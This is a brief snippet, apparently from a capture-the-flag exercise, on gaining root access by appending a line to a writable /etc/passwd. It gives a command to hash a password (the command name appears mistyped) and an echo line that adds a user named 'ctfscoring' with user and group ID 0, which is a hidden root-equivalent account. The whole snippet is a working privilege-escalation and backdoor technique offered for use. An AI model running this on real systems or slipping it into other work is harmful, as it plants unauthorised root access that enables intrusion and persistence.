You can write the /etc/passwd file to add a user.

```bash
# Generate password hash
openssl password marbdawg
# Add a use of root group to /etc/passwd, with username ctfscoring and password marbdawg
echo 'ctfscoring:$1$0giYuYc1$DZRMYFpCPDVjuzAGo4z.s0:0:0:root:/root:/bin/sh' >> /etc/passwd
```